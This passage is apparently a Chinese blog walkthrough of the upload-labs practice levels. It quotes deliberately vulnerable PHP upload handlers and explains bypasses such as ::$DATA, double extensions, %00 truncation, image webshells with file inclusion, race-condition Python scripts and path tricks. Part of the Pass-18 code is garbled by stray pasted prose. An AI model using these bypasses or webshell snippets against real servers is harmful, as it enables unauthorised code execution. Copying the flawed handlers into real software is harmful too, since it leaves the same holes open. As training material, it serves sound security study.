+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;此文件类型不允许上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
+<p>利用windows特性，可在后缀名中加” ::$DATA”绕过。</p>
+<h2 id="Pass-09-点空格绕过"><a href="#Pass-09-点空格绕过" class="headerlink" title="Pass-09 点空格绕过"></a>Pass-09 点空格绕过</h2><p>源码：</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, &#39;.&#39;);
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125; else &#123;
+            $msg = &#39;此文件类型不允许上传！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>原理:查看源码发现，都过滤但是，点和空格只是过滤了1次，所以我们可以尝试构造.php. .这样就只是过滤了文件末尾的点而没有过滤第一个点，文件后缀变成了.php.实现了文件的上传。</p>
+<h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h2><p>源码：</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;        
+        if (move_uploaded_file($temp_file, $img_path)) &#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &#39;上传出错！&#39;;
+        &#125;
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>原理:查看源码发现，没有过滤点，空格，大写等，估计这种不是放在windows下的，看源码发现str_ireplace这个函数将php，php5，php4等后缀变成空格，且只执行了一次，所以可以尝试构造文件后缀为pphphp绕过。</p>
+<h2 id="Pass-11-00截断-get传输"><a href="#Pass-11-00截断-get传输" class="headerlink" title="Pass-11 %00截断 get传输"></a>Pass-11 %00截断 get传输</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &#39;上传出错！&#39;;
+        &#125;
+    &#125; else&#123;
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    &#125;
+&#125;</code></pre>
+<p>原理:查看源码发现使用了白名单，只允许jpg，png，gif文件的上传，发现路径img_path函数是让文件位置(save_path)加时间随机数(rand)的方法生成文件位置和文件名称</p>
+<p>所以这里我们可以尝试在save_path的地方使用%00的方法截断后面的语句，burpsuite抓包发现，是可以更改save_path的</p>
+<p>不过此方法有使用的限制。使用限制:</p>
+<pre><code>1、php版本小于5.3.4
+2、php.ini的magic_quotes_gpc为OFF状态。 (magic_quotes_gpc)函数的的底层实现是类似c语言，所以可以%00截断</code></pre>
+<p>！<a target="_blank" rel="noopener" href="https://lmg66.github.io/img/34.png"></a></p>
+<h2 id="Pass-12-00截断-post传输"><a href="#Pass-12-00截断-post传输" class="headerlink" title="Pass-12 %00截断 post传输"></a>Pass-12 %00截断 post传输</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &quot;上传失败&quot;;
+        &#125;
+    &#125; else &#123;
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    &#125;
+&#125;</code></pre>
+<p>post传输和get传输差不多，但因为POST不会像GET对%00进行自动解码,需要转一下码（或者在二进制中修改）,如图，然后发送发现上传成功。</p>
+<p><img src="https://lnng.top/img/36.png"></p>
+<p><img src="https://lnng.top/img/37.png"></p>
+<h2 id="Pass-13-图片马-文件包含利用"><a href="#Pass-13-图片马-文件包含利用" class="headerlink" title="Pass-13 图片马 文件包含利用"></a>Pass-13 图片马 文件包含利用</h2><p>源码</p>
+<pre><code>function getReailFileType($filename)&#123;
+    $file = fopen($filename, &quot;rb&quot;);
+    $bin = fread($file, 2); //只读2字节
+    fclose($file);
+    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    
+    $fileType = &#39;&#39;;    
+    switch($typeCode)&#123;      
+        case 255216:            
+            $fileType = &#39;jpg&#39;;
+            break;
+        case 13780:            
+            $fileType = &#39;png&#39;;
+            break;        
+        case 7173:            
+            $fileType = &#39;gif&#39;;
+            break;
+        default:            
+            $fileType = &#39;unknown&#39;;
+        &#125;    
+        return $fileType;
+&#125;
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $file_type = getReailFileType($temp_file);
+
+    if($file_type == &#39;unknown&#39;)&#123;
+        $msg = &quot;文件未知，上传失败！&quot;;
+    &#125;else&#123;
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>制作图片马：</p>
+<pre><code>&gt;copy 1.jpg /b + 1.txt /a shell.jpg</code></pre>
+<p>1.txt中的内容为一句话木马，1.jpg则是一张图片。生成的图片马是shell.jpg。</p>
+<p>其他制作图片马方法：</p>
+<pre><code>1、右键图片选择属性，详细信息，版权处加入木马。
+
+2、edjpg软件
+将图片直接拖到edjpg.exe上，在弹出窗口内输入一句话木马即可。
+
+3、十六进制编辑器编辑添加
+用010 Editor或winhex等十六进制编辑器打开图片，将一句话木马插入到右边最底层或最上层后保存。</code></pre>
+<p>顺利的上传图片马，图片名会重新命名，所以burp上传，记得看一下。直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p>
+<p>利用include.php实现文件包含（自带有）：</p>
+<pre><code>&lt;?php
+/*
+本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
+*/
+header(&quot;Content-Type:text/html;charset=utf-8&quot;);
+$file = $_GET[&#39;file&#39;];
+if(isset($file))&#123;
+    include $file;
+&#125;else&#123;
+    show_source(__file__);
+&#125;
+?&gt;</code></pre>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=./upload/7120210518080656.jpg">http://127.0.0.1/include.php?file=./upload/7120210518080656.jpg</a></p>
+<h2 id="Pass-14-图片马-getimagesize-文件包含利用"><a href="#Pass-14-图片马-getimagesize-文件包含利用" class="headerlink" title="Pass-14 图片马 getimagesize() 文件包含利用"></a>Pass-14 图片马 getimagesize() 文件包含利用</h2><p>源码</p>
+<pre><code>function isImage($filename)&#123;
+    $types = &#39;.jpeg|.png|.gif&#39;;
+    if(file_exists($filename))&#123;
+        $info = getimagesize($filename);
+        $ext = image_type_to_extension($info[2]);
+        if(stripos($types,$ext))&#123;
+            return $ext;
+        &#125;else&#123;
+            return false;
+        &#125;
+    &#125;else&#123;
+        return false;
+    &#125;
+&#125;
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $res = isImage($temp_file);
+    if(!$res)&#123;
+        $msg = &quot;文件未知，上传失败！&quot;;
+    &#125;else&#123;
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>getimagesize()函数，用于取得图像大小，如果指定的图像或其不是有效的图像，getimagesize()将返回false并产生一条E_WARNING级的错误</p>
+<p>Image_type_to_extension()，用于取得图像类型的文件后缀</p>
+<p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13</p>
+<h2 id="Pass-15-图片马-exif-imagetype-文件包含利用"><a href="#Pass-15-图片马-exif-imagetype-文件包含利用" class="headerlink" title="Pass-15 图片马 exif_imagetype() 文件包含利用"></a>Pass-15 图片马 exif_imagetype() 文件包含利用</h2><p>源码</p>
+<pre><code>function isImage($filename)&#123;
+    //需要开启php_exif模块
+    $image_type = exif_imagetype($filename);
+    switch ($image_type) &#123;
+        case IMAGETYPE_GIF:
+            return &quot;gif&quot;;
+            break;
+        case IMAGETYPE_JPEG:
+            return &quot;jpg&quot;;
+            break;
+        case IMAGETYPE_PNG:
+            return &quot;png&quot;;
+            break;    
+        default:
+            return false;
+            break;
+    &#125;
+&#125;
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $res = isImage($temp_file);
+    if(!$res)&#123;
+        $msg = &quot;文件未知，上传失败！&quot;;
+    &#125;else&#123;
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;
+        if(move_uploaded_file($temp_file,$img_path))&#123;
+            $is_upload = true;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>exif_imagetype()函数，用于判断一个图像的类型，正常则返回签名对应常量，否则返回false</p>
+<p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13</p>
+<h2 id="Pass-16-图片马-二次渲染绕过"><a href="#Pass-16-图片马-二次渲染绕过" class="headerlink" title="Pass-16 图片马 二次渲染绕过"></a>Pass-16 图片马 二次渲染绕过</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;]))&#123;
+    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
+    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+
+    $target_path=UPLOAD_PATH.basename($filename);
+
+    // 获得上传文件的扩展名
+    $fileext= substr(strrchr($filename,&quot;.&quot;),1);
+
+    //判断文件后缀与类型，合法才进行上传操作
+    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))
+        &#123;
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromjpeg($target_path);
+
+            if($im == false)&#123;
+                $msg = &quot;该文件不是jpg格式的图片！&quot;;
+                @unlink($target_path);
+            &#125;else&#123;
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.jpg&quot;;
+                $newimagepath = UPLOAD_PATH.$newfilename;
+                imagejpeg($im,$newimagepath);
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.$newfilename;
+                @unlink($target_path);
+                $is_upload = true;
+            &#125;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+
+    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))
+        &#123;
+            //使用上传的图片生成新的图片
+            $im = imagecreatefrompng($target_path);
+
+            if($im == false)&#123;
+                $msg = &quot;该文件不是png格式的图片！&quot;;
+                @unlink($target_path);
+            &#125;else&#123;
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.png&quot;;
+                $newimagepath = UPLOAD_PATH.$newfilename;
+                imagepng($im,$newimagepath);
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.$newfilename;
+                @unlink($target_path);
+                $is_upload = true;               
+            &#125;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+
+    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))
+        &#123;
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromgif($target_path);
+            if($im == false)&#123;
+                $msg = &quot;该文件不是gif格式的图片！&quot;;
+                @unlink($target_path);
+            &#125;else&#123;
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.gif&quot;;
+                $newimagepath = UPLOAD_PATH.$newfilename;
+                imagegif($im,$newimagepath);
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.$newfilename;
+                @unlink($target_path);
+                $is_upload = true;
+            &#125;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+    &#125;else&#123;
+        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+    &#125;
+&#125;</code></pre>
+<p>判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，具体可以参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
+<p>imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串</p>
+<p>imagexxx — 以 xxx 格式将图像输出到浏览器或文件</p>
+<p>这里使用容易绕过二次渲染的gif文件。现在制作一个gif图片马，copy就可以了。也可以winhex制作。制作后便上传，发现无法利用。然后将上传的图片重新下载下来，放入winhex，进行对比。可以找到二次渲染后不变的地方，而这个地方就是可以插入一句话的地方。上传修改好的图片马。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1884723/202004/1884723-20200416151903312-918773678.png"></p>
+<h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file))&#123;
+        if(in_array($file_ext,$ext_arr))&#123;
+            $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+            rename($upload_file, $img_path);
+            $is_upload = true;
+        &#125;else&#123;
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+        &#125;
+    &#125;else&#123;
+        $msg = &#39;上传出错！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则通过rename重命名，否则通过unlink删除</p>
+<p>因此我们可以上传shell.php只需要在它删除之前访问即可，可以利用burp的intruder模块（重放攻击）不断上传，然后我们不断的访问刷新该地址即可。</p>
+<p>先创建一个shell.php，内容为</p>
+<pre><code>&lt;?php
+    fputs(fopen(&#39;phpinfo.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);
+?&gt;</code></pre>
+<p>再使用python不断请求</p>
+<pre><code>import requests
+url = &quot;http://127.0.0.1/upload/shell.php&quot;
+while True:
+    html = requests.get(url)
+    if html.status_code == 200:
+        print(&quot;OK&quot;)
+        break
+    else:
+        print(&quot;NO&quot;)</code></pre>
+<p>运行python代码，再用burpsuite-intruder模块批量模拟上传shell.php文件，Tips:intruder模块中，payload选择Null payloads，并且可以选择无限重复，线程也可以根据实际情况加大。</p>
+<p>若是脚本结果出现ok，则说明访问到了shell.php，并且生成了phpinfo.php，可以访问到 <a target="_blank" rel="noopener" href="http://127.0.0.1/upload/phpinfo.php">http://127.0.0.1/upload/phpinfo.php</a></p>
+<p>如果不写脚本，也可以利用burpsuite-intruder模块一并模拟访问包，或者直接浏览器刷新。</p>
+<h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18 条件竞争"></a>Pass-18 条件竞争</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;]))
+&#123;
+    require_once(&quot;./myupload.php&quot;);
+    $imgFileName =time();
+    $u = new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);
+    $status_code = $u-&gt;upload(UPLOAD_PATH);
+    switch ($status_code) &#123;
+        case 1:
+            $is_upload = true;
+            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
+            break;
+        case 2:
+            $msg = &#39;文件已经被上传，但没有重命名。&#39;;
+            break; 
+        case -1:
+            $msg = &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;
+            break; 
+        case -2:
+            $msg = &#39;上传失败，上传目录不可写。&#39;;
+            break; 
+        case -3:
+            $msg = &#39;上传失败，无法上传该类型文件。&#39;;
+            break; 
+        case -4:
+            $msg = &#39;上传失败，上传的文件过大。&#39;;
+            break; 
+        case -5:
+            $msg = &#39;上传失败，服务器已经存在相同名称文件。&#39;;
+            break; 
+        case -6:
+            $msg = &#39;文件无法上传，文件不能复制到目标目录。&#39;;
+            break;      
+        default:
+            $msg = &#39;未知错误！&#39;;
+            break;
+    &#125;
+&#125;
+
+//myupload.php
+class MyUpload&#123;
+......
+......
+...... 本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功：
+**
+** Method to upload the file.
+** This is the only method to call outside the class.
+** @para String name of directory we upload to
+** @returns void
+**/
+function upload( $dir )&#123;
+    &quot;shell_phpinfo.jpg
+    return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret = $this-&gt;setDir( $dir );
+    if( $ret != 1 )&#123;
+    return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret = $this-&gt;checkExtension();
+    if( $ret != 1 )&#123;
+    return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret = $this-&gt;checkSize();
+    if( $ret != 1 )&#123;
+    return $this-&gt;resultUpload( $ret );    
+    &#125;
+
+    // if flag to check if the file exists is set to 1
+
+    if( $this-&gt;cls_file_exists == 1 )&#123;
+
+    $ret = $this-&gt;checkFileExists();
+    if( $ret != 1 )&#123;
+        return $this-&gt;resultUpload( $ret );    
+    &#125;
+    &#125;
+
+    // if we are here, we are ready to move the file to destination
+
+    $ret = $this-&gt;move();
+    if( $ret != 1 )&#123;
+    return $this-&gt;resultUpload( $ret );    
+    &#125;
+
+    // check if we need to rename the file
+
+    if( $this-&gt;cls_rename_file == 1 )&#123;
+    $ret = $this-&gt;renameFile();
+    if( $ret != 1 )&#123;
+        return $this-&gt;resultUpload( $ret );    
+    &#125;
+    &#125;
+
+    // if we are here, everything worked as planned :)
+
+    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );
+
+&#125;
+......
+......
+...... 
+&#125;;</code></pre>
+<p>本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。</p>
+<p>题目bug，index.php中 $status_code = $u-&gt;upload(UPLOAD_PATH); 改成 $status_code = $u-&gt;upload(UPLOAD_PATH+“/”);</p>
+<p>制作图片马shell_phpinfo.jpg，图片马作用是生成phpinfo.php</p>
+<pre><code>&lt;?php fputs(fopen(&#39;phpinfo.php&#39;,&#39;w&#39;),&#39;&lt;?php phpinfo(); ?&gt;&#39;);?&gt;</code></pre>
+<p>编写脚本1.py</p>
+<pre><code>import requests
+url = &quot;http://127.0.0.1/upload/shell_phpinfo.jpg&quot;
+while True:
+    html = requests.get(url)
+    if html.status_code == 200:
+        print(&quot;OK&quot;)
+        break
+    else:
+        print(&quot;NO&quot;)</code></pre>
+<p>同Pass-18，运行1.py,bp重放攻击，可以访问竞争到shell_phpinfo.jpg文件</p>
+<p>再文件包含利用，编写脚本2.py</p>
+<pre><code>import requests
+url = &quot;http://127.0.0.1/include.php?file=./upload/shell_phpinfo.jpg&quot;
+while True:
+    html = requests.get(url)
+    if &#39;phpinfo()&#39; in html.text:
+        print(&quot;OK&quot;)
+        break
+    else:
+        print(&quot;NO&quot;)</code></pre>
+<p>运行2.py,bp重放攻击，生成了phpinfo.php</p>
+<h2 id="Pass-19-绕过"><a href="#Pass-19-绕过" class="headerlink" title="Pass-19 /.绕过"></a>Pass-19 /.绕过</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists(UPLOAD_PATH)) &#123;
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name = $_POST[&#39;save_name&#39;];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) &#123;
+            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) &#123; 
+                $is_upload = true;
+            &#125;else&#123;
+                $msg = &#39;上传出错！&#39;;
+            &#125;
+        &#125;else&#123;
+            $msg = &#39;禁止保存为该类型文件！&#39;;
+        &#125;
+
+    &#125; else &#123;
+        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<p>绕过姿势：Pathinfo()会返回一个关联数组含有path的信息。例如：</p>
+<p><img src="https://lnng.top/img/66.png"></p>
+<p>save_name=shell.php/.这样file_ext值为空绕过黑名单，而move_uploaded_file函数忽略文件后的./就可以实现保存文件为shell.php</p>
+<p>直接加一个.号也可以绕过</p>
+<p><img src="https://lmg66.github.io/img/67.png"></p>
+<h2 id="Pass-20-数组绕过"><a href="#Pass-20-数组绕过" class="headerlink" title="Pass-20 数组绕过"></a>Pass-20 数组绕过</h2><p>源码</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if(!empty($_FILES[&#39;upload_file&#39;]))&#123;
+    //检查MIME
